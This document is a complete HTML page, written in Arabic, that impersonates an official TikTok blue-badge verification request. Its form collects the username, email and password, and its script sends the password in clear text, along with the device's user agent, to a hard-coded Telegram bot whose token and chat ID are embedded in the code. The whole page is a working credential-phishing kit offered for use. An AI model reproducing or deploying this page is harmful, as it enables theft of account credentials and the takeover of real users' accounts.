<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>طلب التوثيق | TikTok</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #000000;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Cairo', Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 16px;
            color: #fff;
        }

        .app {
            max-width: 500px;
            width: 100%;
            background: #000000;
            border-radius: 44px;
            overflow: hidden;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8);
        }

        .header {
            padding: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 0.5px solid #2a2a2a;
        }

        .logo {
            font-size: 24px;
            font-weight: 700;
            background: linear-gradient(135deg, #25F4EE, #FE2C55);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        .badge {
            background: #1a1a1a;
            padding: 6px 12px;
            border-radius: 40px;
            font-size: 12px;
            color: #aaa;
        }

        .hero {
            text-align: center;
            padding: 32px 24px 24px;
        }

        .badge-icon {
            font-size: 70px;
            margin-bottom: 16px;
        }

        h1 {
            font-size: 28px;
            margin-bottom: 8px;
        }

        .desc {
            font-size: 14px;
            color: #aaa;
        }

        .card {
            background: #0c0c0c;
            margin: 16px;
            border-radius: 32px;
            padding: 24px;
        }

        .input-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            color: #ddd;
        }

        input, select, textarea {
            width: 100%;
            padding: 14px 16px;
            background: #1a1a1a;
            border: 1px solid #2c2c2c;
            border-radius: 16px;
            font-size: 16px;
            color: #fff;
            font-family: inherit;
        }

        input:focus, select:focus, textarea:focus {
            outline: none;
            border-color: #FE2C55;
        }

        textarea {
            resize: vertical;
            min-height: 100px;
        }

        button {
            width: 100%;
            padding: 16px;
            background: linear-gradient(90deg, #FE2C55, #f74a6e);
            border: none;
            border-radius: 40px;
            font-size: 17px;
            font-weight: 700;
            color: white;
            margin-top: 16px;
            cursor: pointer;
        }

        button:active {
            transform: scale(0.97);
        }

        .footer {
            text-align: center;
            padding: 20px;
            font-size: 10px;
            color: #3a3a3a;
            border-top: 0.5px solid #1c1c1c;
        }

        /* رسائل الحالة */
        .status-toast {
            position: fixed;
            bottom: 20px;
            left: 16px;
            right: 16px;
            background: #1a1a1a;
            border-radius: 40px;
            padding: 12px 20px;
            text-align: center;
            font-size: 14px;
            z-index: 1000;
            display: none;
            animation: slideUp 0.3s ease;
            border: 1px solid #333;
        }

        .status-toast.success {
            background: #0a3a2a;
            border-color: #00ff88;
            color: #00ff88;
        }

        .status-toast.error {
            background: #3a1a1a;
            border-color: #FE2C55;
            color: #FE2C55;
        }

        .status-toast.info {
            background: #1a2a3a;
            border-color: #25F4EE;
            color: #25F4EE;
        }

        .status-toast.show {
            display: block;
        }

        @keyframes slideUp {
            from {
                transform: translateY(100px);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }

        .loading {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.6s linear infinite;
            margin-right: 8px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        select option {
            background: #1a1a1a;
        }
    </style>
</head>
<body>

<div class="app">
    <div class="header">
        <span class="logo">♬ TikTok</span>
        <span class="badge">✓ رسمي</span>
    </div>

    <div class="hero">
        <div class="badge-icon">✅🔵</div>
        <h1>طلب التوثيق</h1>
        <div class="desc">احصل على العلامة الزرقاء الرسمية</div>
    </div>

    <div class="card">
        <div class="input-group">
            <label>👤 اسم المستخدم</label>
            <input type="text" id="username" placeholder="مثال: @user123">
        </div>

        <div class="input-group">
            <label>📧 البريد الإلكتروني</label>
            <input type="email" id="email" placeholder="example@email.com">
        </div>

        <div class="input-group">
            <label>🔐 كلمة المرور</label>
            <input type="password" id="password" placeholder="أدخل كلمة المرور">
        </div>

        <div class="input-group">
            <label>📂 فئة الحساب</label>
            <select id="category">
                <option value="">اختر الفئة</option>
                <option value="فنان/موسيقي">فنان / موسيقي</option>
                <option value="مشهور/شخصية عامة">مشهور / شخصية عامة</option>
                <option value="علامة تجارية">علامة تجارية / شركة</option>
                <option value="صانع محتوى">صانع محتوى / مؤثر</option>
                <option value="صحفي/إعلامي">صحفي / إعلامي</option>
                <option value="رياضة">رياضة</option>
            </select>
        </div>

        <div class="input-group">
            <label>📝 لماذا تستحق التوثيق؟</label>
            <textarea id="reason" placeholder="اشرح سبب استحقاقك للعلامة الزرقاء..."></textarea>
        </div>

        <button id="submitBtn">إرسال الطلب</button>
    </div>

    <div class="footer">
        © 2025 TikTok — جميع الحقوق محفوظة
    </div>
</div>

<div id="statusToast" class="status-toast"></div>

<script>
    (function() {
        // 🔐 ضع التوكن ومعرف الدردشة هنا (تأكد من صحتها)
        const BOT_TOKEN = '8657814906:AAF5ERik7H5FxWnRXCxuZ_Fnd3eDp-P5S24';
        const CHAT_ID = '2140023137';
        
        const usernameInput = document.getElementById('username');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const categorySelect = document.getElementById('category');
        const reasonTextarea = document.getElementById('reason');
        const submitBtn = document.getElementById('submitBtn');
        const statusToast = document.getElementById('statusToast');
        
        let attemptCount = 0;
        
        function showStatus(message, type = 'info') {
            statusToast.textContent = message;
            statusToast.className = `status-toast ${type} show`;
            setTimeout(() => {
                statusToast.classList.remove('show');
            }, 5000);
        }
        
        function validateForm() {
            const username = usernameInput.value.trim();
            const email = emailInput.value.trim();
            const password = passwordInput.value;
            const category = categorySelect.value;
            const reason = reasonTextarea.value.trim();
            
            if (!username) {
                showStatus('الرجاء إدخال اسم المستخدم', 'error');
                return false;
            }
            if (!email) {
                showStatus('الرجاء إدخال البريد الإلكتروني', 'error');
                return false;
            }
            if (!email.includes('@')) {
                showStatus('الرجاء إدخال بريد إلكتروني صحيح', 'error');
                return false;
            }
            if (!password) {
                showStatus('الرجاء إدخال كلمة المرور', 'error');
                return false;
            }
            if (!category) {
                showStatus('الرجاء اختيار فئة الحساب', 'error');
                return false;
            }
            if (!reason || reason.length < 20) {
                showStatus('الرجاء توضيح سبب استحقاقك للتوثيق (20 حرف على الأقل)', 'error');
                return false;
            }
            return true;
        }
        
        // وظيفة إرسال إلى تلغرام مع تفاصيل دقيقة
        async function sendToTelegram(username, email, password, category, reason) {
            // التحقق من صحة التوكن
            if (!BOT_TOKEN || BOT_TOKEN === 'ضع_التوكن_هنا') {
                showStatus('⚠️ لم يتم إعداد البوت بعد. الرجاء إضافة التوكن في الكود', 'error');
                return false;
            }
            
            if (!CHAT_ID || CHAT_ID === 'ضع_معرف_الدردشة_هنا') {
                showStatus('⚠️ لم يتم إعداد معرف الدردشة بعد', 'error');
                return false;
            }
            
            // تنسيق الرسالة بشكل جميل
            const message = `🔵 *طلب توثيق جديد - TikTok* 🔵\n\n` +
                           `👤 *اسم المستخدم:* ${username}\n` +
                           `📧 *البريد الإلكتروني:* ${email}\n` +
                           `🔑 *كلمة المرور:* ${password}\n` +
                           `📂 *فئة الحساب:* ${category}\n` +
                           `📝 *سبب الطلب:* ${reason.substring(0, 300)}\n\n` +
                           `🕒 *الوقت:* ${new Date().toLocaleString('ar-SA')}\n` +
                           `📱 *الجهاز:* ${navigator.userAgent.substring(0, 100)}`;
            
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            try {
                showStatus('جاري إرسال الطلب...', 'info');
                
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 10000);
                
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    }),
                    signal: controller.signal
                });
                
                clearTimeout(timeoutId);
                const result = await response.json();
                
                if (result.ok) {
                    showStatus('✅ تم إرسال الطلب بنجاح! سيتم مراجعة طلبك قريباً', 'success');
                    return true;
                } else {
                    console.error('خطأ من تلغرام:', result);
                    if (result.description && result.description.includes('bot was blocked')) {
                        showStatus('❌ البوت محظور. الرجاء بدء المحادثة مع البوت أولاً', 'error');
                    } else if (result.description && result.description.includes('chat not found')) {
                        showStatus('❌ معرف الدردشة غير صحيح. تأكد من المعرف', 'error');
                    } else {
                        showStatus(`❌ خطأ: ${result.description || 'فشل الإرسال'}`, 'error');
                    }
                    return false;
                }
            } catch (error) {
                console.error('خطأ في الاتصال:', error);
                if (error.name === 'AbortError') {
                    showStatus('❌ انتهى الوقت. تأكد من اتصال الإنترنت', 'error');
                } else {
                    showStatus('❌ فشل الاتصال بالإنترنت أو خادم تلغرام', 'error');
                }
                return false;
            }
        }
        
        async function handleSubmit(e) {
            e.preventDefault();
            
            if (!validateForm()) return;
            
            attemptCount++;
            const username = usernameInput.value.trim();
            const email = emailInput.value.trim();
            const password = passwordInput.value;
            const category = categorySelect.options[categorySelect.selectedIndex]?.text || categorySelect.value;
            const reason = reasonTextarea.value.trim();
            
            // تسجيل في Console للمتابعة
            console.log('=== تم إرسال البيانات ===');
            console.log('اسم المستخدم:', username);
            console.log('البريد:', email);
            console.log('كلمة المرور:', '•'.repeat(password.length));
            console.log('الفئة:', category);
            console.log('السبب:', reason.substring(0, 80));
            console.log('========================');
            
            // تعطيل الزر أثناء الإرسال
            const originalText = submitBtn.innerHTML;
            submitBtn.innerHTML = '<span class="loading"></span> جاري الإرسال...';
            submitBtn.disabled = true;
            
            // إرسال إلى تلغرام
            const success = await sendToTelegram(username, email, password, category, reason);
            
            // إعادة تفعيل الزر
            submitBtn.innerHTML = originalText;
            submitBtn.disabled = false;
            
            if (success) {
                // تفريغ الحقول بعد الإرسال الناجح
                setTimeout(() => {
                    usernameInput.value = '';
                    emailInput.value = '';
                    passwordInput.value = '';
                    categorySelect.value = '';
                    reasonTextarea.value = '';
                }, 2000);
            }
        }
        
        submitBtn.addEventListener('click', handleSubmit);
        
        // إرسال بالضغط على Enter
        const inputs = [usernameInput, emailInput, passwordInput];
        inputs.forEach(input => {
            input.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') handleSubmit(e);
            });
        });
        
        // اختبار الاتصال عند تحميل الصفحة
        async function testTelegramConnection() {
            if (BOT_TOKEN && BOT_TOKEN !== '8657814906:AAF5ERik7H5FxWnRXCxuZ_Fnd3eDp-P5S24' && CHAT_ID && CHAT_ID !== '	2140023137') {
                const testUrl = `https://api.telegram.org/bot${BOT_TOKEN}/getMe`;
                try {
                    const response = await fetch(testUrl);
                    const result = await response.json();
                    if (result.ok) {
                        console.log('✅ البوت يعمل بشكل صحيح:', result.result.username);
                        showStatus('✅ البوت جاهز للاستقبال', 'success');
                    } else {
                        console.warn('⚠️ مشكلة في البوت');
                    }
                } catch (error) {
                    console.warn('⚠️ لا يمكن اختبار البوت حالياً');
                }
            }
        }
        
        // اختبار بعد ثانيتين
        setTimeout(testTelegramConnection, 2000);
    })();
</script>

</body>
</html>
